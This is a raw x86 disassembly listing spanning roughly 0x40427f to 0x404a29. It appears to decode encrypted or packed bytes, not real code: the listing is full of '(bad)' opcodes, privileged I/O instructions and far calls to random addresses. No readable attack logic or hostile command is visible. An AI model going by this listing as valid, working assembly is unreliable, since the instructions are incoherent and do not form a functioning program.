  40427f:	jl     0x404250
  404281:	bound  esp,QWORD PTR ds:[ebp-0x6c895bb2]
  404288:	inc    eax
  404289:	rol    esi,cl
  40428b:	sub    BYTE PTR [eax],bh
  40428d:	adc    al,0x5a
  40428f:	imul   esp,DWORD PTR [ecx],0x358d2e35
  404295:	jle    0x404246
  404297:	ja     0x4042a8
  404299:	xchg   esi,eax
  40429a:	(bad)  
  40429c:	call   0x233005ea
  4042a1:	and    eax,0x9c475eef
  4042a6:	xchg   edi,eax
  4042a7:	or     al,0xfd
  4042a9:	inc    ecx
  4042aa:	pop    ds
  4042ab:	cwde   
  4042ac:	(bad)  
  4042ad:	stos   DWORD PTR es:[edi],eax
  4042ae:	dec    ecx
  4042af:	pop    ebx
  4042b0:	xchg   esp,eax
  4042b1:	inc    ebp
  4042b2:	jle    0x40426d
  4042b4:	data16 cmp al,0xed
  4042b7:	outs   dx,DWORD PTR ds:[esi]
  4042b8:	inc    eax
  4042b9:	xlat   BYTE PTR ds:[ebx]
  4042ba:	adc    BYTE PTR [eax+0x45242a92],ah
  4042c0:	push   ecx
  4042c1:	pop    ss
  4042c2:	repnz cwde 
  4042c4:	aad    0x4
  4042c6:	rcr    bl,1
  4042c8:	inc    edi
  4042c9:	adc    dl,BYTE PTR [esp+ebx*2]
  4042cc:	js     0x404337
  4042ce:	push   0xc4136844
  4042d3:	(bad)  
  4042d4:	lahf   
  4042d5:	daa    
  4042d6:	or     al,0xed
  4042d8:	ret    
  4042d9:	stos   DWORD PTR es:[edi],eax
  4042da:	sahf   
  4042db:	js     0x4042c4
  4042dd:	inc    eax
  4042de:	loope  0x4042a1
  4042e0:	cmp    ah,0xbb
  4042e3:	inc    esi
  4042e4:	mov    BYTE PTR [edi+ecx*4],bh
  4042e7:	push   0xc070e0cc
  4042ec:	call   0x3fa1842
  4042f1:	adc    ebp,DWORD PTR [esi]
  4042f3:	imul   ebx,eax,0x65
  4042f6:	xlat   BYTE PTR ds:[ebx]
  4042f7:	outs   dx,BYTE PTR ds:[esi]
  4042f8:	arpl   WORD PTR [esi-0x8],ax
  4042fb:	bound  esi,QWORD PTR [eax+0x66c7104]
  404301:	cmp    al,0xa4
  404303:	loope  0x4042a7
  404305:	xor    DWORD PTR [ecx-0x5260e301],eax
  40430b:	or     DWORD PTR [edi+0xd],esi
  40430e:	adc    al,0x67
  404310:	mov    eax,0xc331fabe
  404315:	inc    edi
  404316:	jno    0x404378
  404318:	mov    al,0x65
  40431a:	lahf   
  40431b:	out    dx,al
  40431c:	cmp    bh,bh
  40431e:	or     bh,al
  404320:	not    edi
  404322:	inc    ecx
  404323:	dec    ecx
  404324:	sbb    bh,BYTE PTR [edx]
  404326:	jno    0x404330
  404328:	adc    DWORD PTR [ecx+edx*2-0x63],esp
  40432c:	adc    dh,ch
  40432e:	and    eax,0x3fd963a1
  404333:	lock mov dl,0xab
  404336:	pop    edi
  404337:	add    BYTE PTR [eax],ah
  404339:	dec    ebp
  40433a:	dec    ebx
  40433b:	mov    esp,0xfc691c07
  404340:	mov    bh,BYTE PTR [esi]
  404342:	repnz ins BYTE PTR es:[edi],dx
  404344:	dec    edx
  404345:	add    BYTE PTR [esi+esi*8+0x66],dh
  404349:	mov    ah,0xb0
  40434b:	dec    edx
  40434c:	test   ecx,esi
  40434e:	loope  0x40438b
  404350:	ins    DWORD PTR es:[edi],dx
  404351:	add    eax,0x19a18073
  404356:	dec    esi
  404357:	or     al,0x13
  404359:	xchg   edx,eax
  40435a:	popa   
  40435b:	and    eax,0xf215c45f
  404360:	add    edx,DWORD PTR [eax+0x5c]
  404363:	lods   al,BYTE PTR ds:[esi]
  404364:	icebp  
  404365:	cmc    
  404366:	cli    
  404367:	mov    ecx,0xcef50ec8
  40436c:	pop    ecx
  40436d:	sbb    al,bh
  40436f:	xlat   BYTE PTR ds:[ebx]
  404370:	fstp   DWORD PTR [ecx+0x5d]
  404373:	loope  0x404330
  404375:	retf   
  404376:	lods   al,BYTE PTR ds:[esi]
  404377:	jl     0x40435b
  404379:	push   esi
  40437a:	js     0x404398
  40437c:	xchg   bp,ax
  40437e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40437f:	xor    dh,bl
  404381:	out    dx,eax
  404382:	fs mov ecx,0xa56480b8
  404388:	aad    0xd2
  40438a:	xchg   ebx,eax
  40438b:	and    DWORD PTR [ebx],edx
  40438d:	leave  
  40438e:	shl    al,1
  404390:	shl    BYTE PTR [edx],0x68
  404393:	ins    BYTE PTR es:[edi],dx
  404394:	mov    eax,0x569f8e15
  404399:	loope  0x40440a
  40439b:	ds and al,0xad
  40439e:	cmp    DWORD PTR [ebx],edi
  4043a0:	sti    
  4043a1:	jnp    0x40433c
  4043a3:	(bad)  
  4043a4:	stos   DWORD PTR es:[edi],eax
  4043a5:	push   edx
  4043a6:	inc    esi
  4043a7:	inc    ecx
  4043a8:	add    BYTE PTR [esi+0x28],cl
  4043ab:	scas   eax,DWORD PTR es:[edi]
  4043ac:	js     0x404405
  4043ae:	test   al,0xcc
  4043b0:	pop    eax
  4043b1:	mov    ds:0x2e341e28,al
  4043b6:	mov    ebp,DWORD PTR [esi-0x65253cd]
  4043bc:	iret   
  4043bd:	sbb    ah,ah
  4043bf:	and    BYTE PTR [ebx+esi*4+0x8],al
  4043c3:	mov    ebx,0x6cb8be36
  4043c8:	scas   eax,DWORD PTR es:[edi]
  4043c9:	jp     0x4043d7
  4043cb:	push   0x30
  4043cd:	ja     0x4043a0
  4043cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d0:	jl     0x40436b
  4043d2:	or     al,0xe5
  4043d4:	stos   BYTE PTR es:[edi],al
  4043d5:	dec    esp
  4043d6:	and    ah,BYTE PTR [ebx]
  4043d8:	adc    BYTE PTR [edi],ch
  4043da:	call   DWORD PTR [ebx+0x6e]
  4043dd:	test   eax,0x4496766d
  4043e2:	adc    edx,ebx
  4043e4:	xchg   ecx,eax
  4043e5:	call   0x811e7145
  4043ea:	call   0x3123:0x110a0f6e
  4043f1:	cmp    ch,BYTE PTR [esi]
  4043f3:	mov    cl,0xb1
  4043f5:	pop    esi
  4043f6:	popa   
  4043f7:	into   
  4043f8:	dec    esp
  4043f9:	aas    
  4043fa:	add    ebx,DWORD PTR [eax]
  4043fc:	xor    edi,DWORD PTR [eax+0x29]
  4043ff:	push   esp
  404400:	mov    al,0x6e
  404402:	jns    0x4043f1
  404404:	mov    ebp,0x77e8b8a4
  404409:	sahf   
  40440a:	add    ebx,DWORD PTR [ecx+0x2a]
  40440d:	sti    
  40440e:	leave  
  40440f:	or     ch,BYTE PTR [ebx+esi*2-0xa]
  404413:	sti    
  404414:	(bad)  
  404415:	cdq    
  404416:	enter  0x5890,0xba
  40441a:	mul    BYTE PTR [edx+0x1ba88a91]
  404420:	xor    DWORD PTR [edi+0x5],ebp
  404423:	fstp   QWORD PTR [edx-0x3397de66]
  404429:	or     BYTE PTR [edi-0x5b],bh
  40442c:	scas   al,BYTE PTR es:[edi]
  40442d:	sub    al,0x29
  40442f:	rol    BYTE PTR [ebp+0x6f9df80],0xb7
  404436:	jle    0x4043e0
  404438:	clc    
  404439:	popf   
  40443a:	jecxz  0x404483
  40443c:	(bad)  
  40443d:	pushw  ss
  40443f:	iret   
  404440:	xor    eax,0xb1484ba8
  404445:	repz mov ch,0x34
  404448:	(bad)  
  404449:	adc    ebx,esp
  40444b:	xor    al,0xbf
  40444d:	in     al,0x87
  40444f:	jecxz  0x40442e
  404451:	loope  0x404408
  404453:	int    0xab
  404455:	xor    DWORD PTR [edi],esp
  404457:	xchg   edi,eax
  404458:	test   eax,0x722cea94
  40445d:	nop
  40445e:	add    al,0x5c
  404460:	in     al,dx
  404461:	mov    al,ds:0x8696afee
  404466:	push   ecx
  404467:	ins    BYTE PTR es:[edi],dx
  404468:	inc    eax
  404469:	test   BYTE PTR [ecx],dh
  40446b:	shr    DWORD PTR [ecx],0xee
  40446e:	push   es
  40446f:	pop    ss
  404470:	inc    edx
  404471:	clc    
  404472:	aam    0x73
  404474:	or     BYTE PTR [edi-0x4ac7cb0b],dl
  40447a:	pop    eax
  40447b:	mov    WORD PTR [ebx+0x69],gs
  40447e:	dec    edx
  40447f:	hlt    
  404480:	cmc    
  404481:	bswap  ecx
  404483:	sbb    esi,0x13d743a6
  404489:	in     eax,0x4e
  40448b:	cmc    
  40448c:	retf   
  40448d:	(bad)  
  40448e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404490:	int    0xbb
  404492:	dec    esp
  404493:	mov    bl,0x7f
  404495:	in     eax,0xdd
  404497:	xchg   edi,eax
  404498:	call   0xab9b:0x47e413f6
  40449f:	js     0x404462
  4044a1:	pop    edi
  4044a2:	push   ebp
  4044a3:	or     edx,edi
  4044a5:	or     DWORD PTR [edx+0x2],esp
  4044a8:	ret    
  4044a9:	shl    DWORD PTR [edx],1
  4044ab:	cmp    DWORD PTR [ecx+0x54],0x610c73ba
  4044b2:	xchg   edx,eax
  4044b3:	inc    edx
  4044b4:	cs sbb esp,ecx
  4044b7:	push   esp
  4044b8:	xor    DWORD PTR [ebp+eiz*2+0x73cfc9b],0xffffffbe
  4044c0:	pop    ds
  4044c1:	fidiv  DWORD PTR [esi]
  4044c3:	jbe    0x404470
  4044c5:	(bad)  
  4044c6:	cmp    al,0x73
  4044c8:	test   DWORD PTR [esi+0x56],0x5335132d
  4044cf:	push   edx
  4044d0:	pop    edx
  4044d1:	adc    eax,0xac51f472
  4044d6:	jl     0x40450e
  4044d8:	inc    edx
  4044d9:	jp     0x40446e
  4044db:	outs   dx,BYTE PTR ds:[esi]
  4044dc:	cdq    
  4044dd:	xchg   esp,eax
  4044de:	das    
  4044df:	cdq    
  4044e0:	fnstenv [edi-0x4b62e145]
  4044e6:	out    dx,eax
  4044e7:	shl    BYTE PTR [edi],0xe8
  4044ea:	inc    esp
  4044eb:	repz lds esi,FWORD PTR [ecx]
  4044ee:	test   BYTE PTR ss:[ebp-0x37],cl
  4044f2:	or     eax,DWORD PTR [ecx+0x17130e93]
  4044f8:	adc    eax,0xc12c32
  4044fd:	lds    edx,FWORD PTR [esp+edx*8]
  404500:	ret    
  404501:	xor    al,BYTE PTR [ecx+0x18]
  404504:	cmp    edx,DWORD PTR [ecx+esi*1+0xda7d098]
  40450b:	adc    BYTE PTR [esi+0x5935986f],cl
  404511:	or     edx,edx
  404513:	adc    al,0x2f
  404515:	and    eax,0x73650145
  40451a:	xchg   ecx,eax
  40451b:	iret   
  40451c:	or     DWORD PTR [edx],esp
  40451e:	mov    bh,BYTE PTR gs:[ebp+ecx*8-0x67]
  404523:	ds lahf 
  404525:	call   0x31e7:0x5aedf956
  40452c:	sub    eax,DWORD PTR [ebx-0x49]
  40452f:	add    DWORD PTR [edx+0x38],esi
  404532:	popf   
  404533:	mov    eax,0x14440b32
  404538:	call   0x4dcc3e18
  40453d:	inc    DWORD PTR [esi+0x7c]
  404540:	jmp    0x9048041d
  404545:	in     eax,dx
  404546:	fistp  QWORD PTR [ebx]
  404548:	shl    BYTE PTR [edx-0x1ffddc4f],1
  40454e:	or     DWORD PTR [esi],ecx
  404550:	pop    ss
  404551:	in     al,dx
  404552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404553:	nop
  404554:	mov    BYTE PTR [esi],dl
  404556:	pop    ss
  404557:	xchg   BYTE PTR [ebp*4+0x319306a0],al
  40455e:	aam    0x81
  404560:	or     DWORD PTR [ebx],edi
  404562:	stos   BYTE PTR es:[edi],al
  404563:	pop    edi
  404564:	pop    ebx
  404565:	sub    BYTE PTR [eax+0x3c8552d5],0xeb
  40456c:	mov    ds:0x4261289f,eax
  404571:	cmp    eax,0xeeae8467
  404576:	ss mov dl,0xe1
  404579:	inc    ebx
  40457a:	retf   0xec9c
  40457d:	xchg   esi,eax
  40457e:	imul   edx,DWORD PTR [ecx+0x5c46330e],0x68160bfb
  404588:	in     al,dx
  404589:	xchg   ebp,eax
  40458a:	mov    ds:0x1e5f3a1,eax
  40458f:	pop    edx
  404590:	js     0x404556
  404592:	mov    dh,0xac
  404594:	jno    0x404532
  404596:	cmp    ch,BYTE PTR [edi+0x43]
  404599:	in     eax,0x12
  40459b:	sub    DWORD PTR [esi+0x232d2d47],ebx
  4045a1:	loope  0x4045b0
  4045a3:	push   ds
  4045a4:	cld    
  4045a5:	cmp    eax,0x3749054f
  4045aa:	aas    
  4045ab:	xchg   DWORD PTR [ebx+ebp*8+0x17],eax
  4045af:	pop    esi
  4045b0:	jmp    0xd269:0x1b247c42
  4045b7:	adc    esi,edx
  4045b9:	call   0xc32a:0xbcae8fbd
  4045c0:	mov    WORD PTR [edi+0x73],es
  4045c3:	repz adc al,0xac
  4045c6:	jmp    0x404556
  4045c8:	mov    al,0xb3
  4045ca:	dec    ebx
  4045cb:	mov    dh,0x8d
  4045cd:	aad    0x14
  4045cf:	inc    ebx
  4045d0:	jne    0x404651
  4045d2:	shl    DWORD PTR [esi+0x5564519],1
  4045d8:	fxch   st(5)
  4045da:	loop   0x40456c
  4045dc:	ret    
  4045dd:	add    ecx,DWORD PTR [ebx-0x70]
  4045e0:	cdq    
  4045e1:	arpl   WORD PTR [ecx],dx
  4045e3:	rcl    DWORD PTR [eax+0x3a],0x19
  4045e7:	xchg   edi,eax
  4045e8:	dec    edx
  4045e9:	xchg   ecx,eax
  4045ea:	mov    cl,0x19
  4045ec:	cli    
  4045ed:	fistp  QWORD PTR [ebp+0x4]
  4045f0:	xchg   ecx,eax
  4045f1:	mov    edx,0x6e1d4062
  4045f6:	xchg   ecx,eax
  4045f7:	icebp  
  4045f8:	jecxz  0x4045ff
  4045fa:	inc    edx
  4045fb:	add    eax,0x7c5c57b6
  404600:	imul   eax,ebp,0x5c8e109a
  404606:	adc    bl,ah
  404608:	fmul   QWORD PTR [eax+esi*8]
  40460b:	lods   eax,DWORD PTR ds:[esi]
  40460c:	pop    edx
  40460d:	pop    eax
  40460e:	je     0x40459a
  404610:	mov    dh,0x7c
  404612:	fnstcw WORD PTR [ecx+0x52]
  404615:	jl     0x4045c4
  404617:	inc    ebp
  404618:	xchg   edx,eax
  404619:	sbb    eax,0xe077866b
  40461e:	iret   
  40461f:	mov    ebp,0x5cfd7664
  404624:	cmp    al,0x84
  404626:	sub    bl,BYTE PTR [ecx]
  404628:	sbb    edx,DWORD PTR [esi+0x71449ca9]
  40462e:	hlt    
  40462f:	repnz mov ecx,0xf2d9438d
  404635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404636:	xor    dl,dl
  404638:	mov    bl,0x7
  40463a:	fidivr DWORD PTR [edi]
  40463c:	rcl    DWORD PTR [edx],0x7a
  40463f:	fst    DWORD PTR [edx-0x711d4dde]
  404645:	imul   eax,DWORD PTR [edi+0x5e],0x26
  404649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40464a:	test   al,0xaa
  40464c:	jl     0x4045d4
  40464e:	fst    DWORD PTR [ebx+0x24903baf]
  404654:	sub    eax,0x546544dd
  404659:	add    dh,cl
  40465b:	xchg   ebp,eax
  40465c:	or     bl,BYTE PTR ds:[ebx+0x314c3abe]
  404663:	retf   0xf7a
  404666:	push   0xb532927f
  40466b:	cwde   
  40466c:	int    0xf2
  40466e:	jle    0x4046ad
  404670:	(bad)  
  404671:	and    BYTE PTR [eax+0x139e6adc],ah
  404677:	jg     0x404685
  404679:	in     al,0x3
  40467b:	cmp    cl,BYTE PTR [esi-0x7b]
  40467e:	mov    eax,0xb1f2a6f8
  404683:	nop
  404684:	ss das 
  404686:	jb     0x4046df
  404688:	int    0x50
  40468a:	mov    DWORD PTR [esi],ebx
  40468c:	mov    esi,0xa3e83251
  404691:	out    dx,eax
  404692:	inc    ebx
  404693:	xchg   DWORD PTR [ebx-0x71bab166],eax
  404699:	jmp    FWORD PTR [ebx-0x5f]
  40469c:	mov    ecx,?
  40469e:	in     eax,0x1b
  4046a0:	adc    ch,cl
  4046a2:	and    ch,BYTE PTR [ebx-0x494f8e38]
  4046a8:	mov    esi,0xe7aea877
  4046ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046ae:	leave  
  4046af:	fistp  QWORD PTR [edx]
  4046b1:	lods   eax,DWORD PTR ds:[esi]
  4046b2:	xchg   edi,eax
  4046b3:	or     DWORD PTR ds:0x507beaa6,ebx
  4046b9:	xor    eax,0xd35ac4bf
  4046be:	push   ecx
  4046bf:	es aas 
  4046c1:	ror    DWORD PTR [edx-0x1980500d],cl
  4046c7:	das    
  4046c8:	pop    esp
  4046c9:	inc    ecx
  4046ca:	adc    cl,ch
  4046cc:	push   ebx
  4046cd:	dec    eax
  4046ce:	mul    DWORD PTR [eax-0x48b6e7d9]
  4046d4:	push   eax
  4046d5:	inc    ecx
  4046d6:	es aam 0x7c
  4046d9:	push   ebp
  4046da:	das    
  4046db:	or     bh,BYTE PTR [ebp+0x29879608]
  4046e1:	call   0xfc736846
  4046e6:	xor    DWORD PTR [esi+0x21],ebp
  4046e9:	xor    BYTE PTR [edx-0x305eec48],0xce
  4046f0:	mov    dh,0x4a
  4046f2:	adc    edx,esp
  4046f4:	jno    0x4046a1
  4046f6:	das    
  4046f7:	push   es
  4046f8:	mov    BYTE PTR [ebx-0x53],dl
  4046fb:	jb     0x404706
  4046fd:	out    0x2e,al
  4046ff:	(bad)  
  404700:	sar    BYTE PTR [esi+0x59f4e5a5],1
  404706:	aaa    
  404707:	push   0xffffff80
  404709:	(bad)  
  40470b:	pop    es
  40470c:	mov    ebp,DWORD PTR [ebx+0x4a]
  40470f:	(bad)  
  404710:	aaa    
  404711:	mov    edx,esi
  404713:	aam    0x2b
  404715:	xchg   ecx,eax
  404716:	xor    esi,DWORD PTR [ebp-0x49]
  404719:	inc    ecx
  40471a:	fistp  QWORD PTR [edx+0x2e]
  40471d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40471e:	scas   eax,DWORD PTR es:[edi]
  40471f:	mov    ds:0x30679658,al
  404724:	cli    
  404725:	daa    
  404726:	jle    0x4046f2
  404728:	clc    
  404729:	dec    edi
  40472a:	push   ebp
  40472b:	push   cs
  40472c:	jne    0x40474f
  40472e:	and    eax,0xbfe7e5ea
  404733:	cmp    eax,0x1c2aae4a
  404738:	adc    al,0xc2
  40473a:	xor    DWORD PTR [esi-0x31],esi
  40473d:	xor    al,0x56
  40473f:	mov    DWORD PTR [ebx],edi
  404741:	shr    DWORD PTR [esi+0x66c99a24],1
  404747:	rcl    al,0x65
  40474a:	test   DWORD PTR [edx+eiz*8+0x16553621],0xa8834a5d
  404755:	out    dx,al
  404756:	and    dl,BYTE PTR [esi]
  404758:	mov    esp,0xfbc4949b
  40475d:	xchg   edi,eax
  40475e:	adc    eax,0xa9ee9c4b
  404763:	and    DWORD PTR [eax-0x7048914c],esp
  404769:	lock mov esi,0x9a423b0f
  40476f:	xchg   cl,bl
  404771:	push   cs
  404772:	sbb    eax,eax
  404774:	cmp    eax,0x7c9d28f8
  404779:	dec    ebp
  40477a:	outs   dx,BYTE PTR ds:[esi]
  40477b:	sbb    esi,DWORD PTR [ebp-0x5e]
  40477e:	ja     0x4047b7
  404780:	sar    BYTE PTR [ebx+0x21],cl
  404783:	call   0x7e86:0xf2838548
  40478a:	arpl   WORD PTR [eax],bp
  40478c:	and    ch,BYTE PTR [edi]
  40478e:	xor    eax,0x6834b5b5
  404793:	cmp    BYTE PTR [eax-0xc],ch
  404796:	add    BYTE PTR [ecx+0x44c026f9],cl
  40479c:	retf   
  40479d:	and    BYTE PTR [eax-0x9],bl
  4047a0:	mov    dh,0x28
  4047a2:	aam    0x3a
  4047a4:	outs   dx,DWORD PTR ds:[esi]
  4047a5:	repz repnz adc al,0x3e
  4047a9:	aad    0xab
  4047ab:	push   es
  4047ac:	cmp    al,0x52
  4047ae:	add    bh,BYTE PTR [eax]
  4047b0:	xchg   ebx,eax
  4047b1:	xor    DWORD PTR [edi],ebp
  4047b3:	or     eax,0x9db6083f
  4047b8:	sbb    eax,0x9514b346
  4047bd:	icebp  
  4047be:	xor    eax,0x114172a6
  4047c3:	mov    ebx,0xb1e0bdbc
  4047c8:	or     al,0xd6
  4047ca:	mov    fs,WORD PTR ds:0xf68bd985
  4047d0:	int    0xa2
  4047d2:	jbe    0x4047f3
  4047d4:	aad    0x50
  4047d6:	or     BYTE PTR [ebx+0x59],ah
  4047d9:	bound  edx,QWORD PTR [ecx]
  4047db:	pop    esp
  4047dc:	mov    eax,ds:0x5495312
  4047e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047e3:	mov    bl,0x6f
  4047e5:	cmc    
  4047e6:	lock fwait
  4047e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047e9:	xor    BYTE PTR [esi+0x59],ah
  4047ec:	jp     0x40479a
  4047ee:	xchg   ebp,eax
  4047ef:	sub    al,0x1e
  4047f1:	xor    al,0x75
  4047f3:	mov    ecx,0x56ae1bd4
  4047f8:	aaa    
  4047f9:	xchg   ebx,eax
  4047fa:	sbb    al,0xc9
  4047fc:	add    eax,0xfd1878eb
  404801:	mov    dh,0x90
  404803:	mov    edi,0x6eddd709
  404808:	pop    es
  404809:	push   ss
  40480a:	cli    
  40480b:	int3   
  40480c:	out    0x3c,al
  40480e:	scas   al,BYTE PTR es:[edi]
  40480f:	or     bl,BYTE PTR [edx]
  404811:	dec    esi
  404812:	inc    ecx
  404813:	adc    BYTE PTR [ebp+0x52],cl
  404816:	xchg   DWORD PTR [edx+0x681c1982],ebx
  40481c:	pop    DWORD PTR [ebx+0x4]
  40481f:	inc    esp
  404820:	sub    eax,0xe63ff4d0
  404825:	loopne 0x4047d7
  404827:	push   eax
  404828:	loopne 0x404876
  40482a:	out    0xb4,al
  40482c:	icebp  
  40482d:	mov    DWORD PTR [ebp+0xd4771fb],0x5bb3a775
  404837:	and    edi,0x5f
  40483a:	stos   BYTE PTR es:[edi],al
  40483b:	je     0x4047e4
  40483d:	sbb    eax,0x76ed2a5b
  404842:	mov    ds:0x868ff6a7,eax
  404847:	jge    0x40489a
  404849:	inc    ecx
  40484a:	inc    eax
  40484b:	jge    0x4047ed
  40484d:	sub    al,BYTE PTR [eax]
  40484f:	inc    ebx
  404850:	js     0x404836
  404852:	push   es
  404853:	aam    0x39
  404855:	aaa    
  404856:	sbb    BYTE PTR [edx-0xb5ac296],ah
  40485c:	xor    eax,0xc0b2cd68
  404861:	and    bl,BYTE PTR ds:0x3283a355
  404867:	aaa    
  404868:	out    0x3,eax
  40486a:	int    0x9d
  40486c:	(bad)  
  40486d:	arpl   WORD PTR [ecx],si
  40486f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404870:	sub    BYTE PTR [esi],ch
  404872:	adc    eax,0x259d7231
  404877:	(bad)
  40487a:	int3   
  40487b:	mov    edx,0xd9ff0eb8
  404880:	neg    ch
  404882:	fnstcw WORD PTR [ecx]
  404884:	sub    al,0x7
  404886:	or     ch,BYTE PTR [ebx]
  404888:	xor    dl,bh
  40488a:	dec    edi
  40488b:	push   ebp
  40488c:	push   eax
  40488d:	les    edx,FWORD PTR [esi]
  40488f:	pusha  
  404890:	mov    esp,0x27f58066
  404895:	dec    esi
  404896:	scas   eax,DWORD PTR es:[edi]
  404897:	imul   ebp,DWORD PTR [ecx],0x5b
  40489a:	xor    dh,dh
  40489c:	(bad)  
  40489d:	and    DWORD PTR [ecx],ebx
  40489f:	dec    ebx
  4048a0:	rcl    DWORD PTR [ebp+0x291b4b75],0x70
  4048a7:	sub    dl,ch
  4048a9:	add    BYTE PTR [ebp-0x28],bh
  4048ac:	xor    al,0x2e
  4048ae:	pop    es
  4048af:	out    dx,eax
  4048b0:	mov    ds:0xde691b84,eax
  4048b5:	add    BYTE PTR [ebp-0x62],bh
  4048b8:	cmp    al,0xd7
  4048ba:	out    dx,al
  4048bb:	mov    ebx,0xc2a4d12
  4048c0:	or     BYTE PTR [ebx+edi*8+0x25],ch
  4048c4:	mov    esp,ebp
  4048c6:	jb     0x40492f
  4048c8:	bound  ecx,QWORD PTR [esi-0x24]
  4048cb:	jbe    0x40491f
  4048cd:	push   ss
  4048ce:	xchg   ecx,eax
  4048cf:	or     ch,bh
  4048d1:	les    edx,FWORD PTR [ecx-0x2f]
  4048d4:	es dec esi
  4048d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048d7:	mov    esi,0x66cde66b
  4048dc:	inc    ecx
  4048dd:	mov    edx,0xf4e92e4c
  4048e2:	call   0xb9bf:0x5c657043
  4048e9:	cmc    
  4048ea:	xor    dl,ah
  4048ec:	aam    0xe2
  4048ee:	push   ebx
  4048ef:	enter  0x74e8,0xe4
  4048f3:	and    bh,ch
  4048f5:	pop    edi
  4048f6:	(bad)  
  4048f7:	fmul   DWORD PTR [ebx-0x106ff3d0]
  4048fd:	ret    0xeb4c
  404900:	lock popf 
  404902:	fdivr  st,st(2)
  404904:	inc    ebx
  404905:	xchg   BYTE PTR ds:0x382b1bb6,al
  40490b:	sub    eax,0x94788808
  404910:	adc    ah,0xac
  404913:	(bad)  
  404914:	rol    BYTE PTR [bx+si+0x10],1
  404918:	(bad)  [ebx+0x61]
  40491b:	mov    BYTE PTR [edx-0x29ac6414],ah
  404921:	lock dec ecx
  404923:	clc    
  404924:	pop    edi
  404925:	push   cs
  404926:	inc    ebp
  404927:	jmp    0x404923
  404929:	clc    
  40492a:	mov    eax,0x9b07ff45
  40492f:	ins    BYTE PTR es:[edi],dx
  404930:	out    dx,eax
  404931:	rcr    dh,0xf8
  404934:	mov    ebx,0xa6c0323a
  404939:	adc    DWORD PTR [ecx],ebx
  40493b:	or     eax,DWORD PTR [esp+ebx*8+0x71cd88c9]
  404942:	jp     0x404998
  404944:	fdivrp st(0),st
  404946:	stc    
  404947:	ret    
  404948:	xor    bh,al
  40494a:	outs   dx,DWORD PTR ds:[esi]
  40494b:	das    
  40494c:	fst    DWORD PTR [esp+ecx*2-0x74beac59]
  404953:	mov    bl,0xbe
  404955:	inc    ecx
  404956:	inc    ebp
  404957:	dec    edx
  404958:	div    BYTE PTR [ebx]
  40495a:	dec    eax
  40495b:	pop    es
  40495c:	sbb    ebp,DWORD PTR [ecx+0x64794555]
  404962:	pop    ebp
  404963:	and    al,0xb4
  404965:	mov    edi,0x20ccc1e6
  40496a:	mov    ebx,0xf3a9e9ae
  404970:	inc    esp
  404971:	out    0x85,eax
  404973:	sub    eax,0x2ad032bf
  404978:	add    al,0x47
  40497a:	and    ecx,DWORD PTR [edx]
  40497c:	arpl   cx,cx
  40497e:	cld    
  40497f:	and    eax,0x8350be3a
  404984:	xchg   cl,dh
  404986:	pop    edx
  404987:	out    0xbd,al
  404989:	jnp    0x4049c0
  40498b:	icebp  
  40498c:	sub    BYTE PTR [eax+0x69],al
  40498f:	jge    0x404a0c
  404991:	mov    edx,DWORD PTR [esi+0x2db6bd5d]
  404997:	cmp    ah,BYTE PTR [ebx+0x22]
  40499a:	add    DWORD PTR [esi+0xffeadb6],ebx
  4049a0:	js     0x40493a
  4049a2:	jns    0x4049a9
  4049a4:	push   edi
  4049a5:	cmp    DWORD PTR [ecx+0x2a],ebx
  4049a8:	mov    edi,0xe0c45eb0
  4049ad:	dec    esp
  4049ae:	cmp    DWORD PTR [edi-0x32],eax
  4049b1:	(bad)  
  4049b2:	into   
  4049b3:	cmp    esp,ecx
  4049b5:	xor    ecx,DWORD PTR [edx+0x1a]
  4049b8:	push   es
  4049b9:	hlt    
  4049ba:	mov    ebx,0x10efc05f
  4049bf:	pop    ss
  4049c0:	inc    esp
  4049c1:	mov    al,0x7b
  4049c3:	xchg   ebp,eax
  4049c4:	xchg   edi,eax
  4049c5:	mov    ds:0xf870cf5c,al
  4049ca:	mov    BYTE PTR [eax],dl
  4049cc:	test   DWORD PTR [ecx-0x57],ebx
  4049cf:	jg     0x404965
  4049d1:	out    0x75,al
  4049d3:	popa   
  4049d4:	ret    0x9ac1
  4049d7:	fsubr  DWORD PTR [ecx+0x2e]
  4049da:	inc    ebx
  4049db:	cdq    
  4049dc:	mov    ds:0x30981abd,al
  4049e1:	dec    ebx
  4049e2:	cwde   
  4049e3:	dec    eax
  4049e4:	les    esi,FWORD PTR [ebx]
  4049e6:	les    esp,FWORD PTR [edx]
  4049e8:	xor    esp,DWORD PTR [ebp+0x12107901]
  4049ee:	xlat   BYTE PTR ds:[ebx]
  4049ef:	adc    al,0x4b
  4049f1:	test   BYTE PTR [ebx-0x66],al
  4049f4:	ror    dh,0xfb
  4049f7:	popf   
  4049f8:	xor    BYTE PTR [edi+esi*2],bh
  4049fb:	inc    edx
  4049fc:	ja     0x4049e3
  4049fe:	iret   
  4049ff:	cmc    
  404a00:	xor    bh,al
  404a02:	nop
  404a03:	pushf  
  404a04:	out    0x97,eax
  404a06:	shl    DWORD PTR [ebx+0x40],1
  404a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a0a:	push   ds
  404a0b:	iret   
  404a0c:	jp     0x404a31
  404a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a0f:	les    ecx,FWORD PTR [esi]
  404a11:	aaa    
  404a12:	sbb    eax,0xb281ad7d
  404a17:	fwait
  404a18:	jo     0x404a76
  404a1a:	or     al,0xc3
  404a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a1d:	and    bh,BYTE PTR [edx-0x50]
  404a20:	leave  
  404a21:	inc    edi
  404a22:	ja     0x404a21
  404a24:	mov    ah,0xf7
  404a26:	inc    ecx
  404a27:	loopne 0x4049b3
  404a29:	dec    ebp
